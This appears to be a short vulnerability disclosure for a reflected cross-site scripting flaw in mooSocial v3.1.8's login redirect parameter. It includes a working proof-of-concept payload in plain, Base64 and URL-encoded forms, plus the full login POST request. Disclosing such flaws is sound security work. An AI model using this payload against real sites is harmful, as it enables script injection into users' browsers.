# mooSocial: XSS
mooSocial v3.1.8 is vulnerable to Reflect cross-site scripting on user login function.

Vulerable Parameter: **data[redirect_url]**

## Exploit - Proof of Concept (POC)

### Reflect cross-site scripting (XSS)
```
Payload : test"><img src=a onerror=alert(1)>test 
Payload (Base64 encoded) : dGVzdCI+PGltZyBzcmM9YSBvbmVycm9yPWFsZXJ0KDEpPnRlc3Q=
Final Payload (Base64+Url encoded): dGVzdCI%2bPGltZyBzcmM9YSBvbmVycm9yPWFsZXJ0KDEpPnRlc3Q%3d%3d

POST Request on /moosocial/users/login (POST REQUEST DATA ONLY): 
[_method=POST&data%5Bredirect_url%5D=dGVzdCI%2bPGltZyBzcmM9YSBvbmVycm9yPWFsZXJ0KDEpPnRlc3Q%3d%3d&data%5BUser%5D%5Bid%5D=&data%5BUser%5D%5Bemail%5D=admin%40localhost.com&data%5BUser%5D%5Bpassword%5D=pas[redacted]&data%5Bremember%5D=0]
```
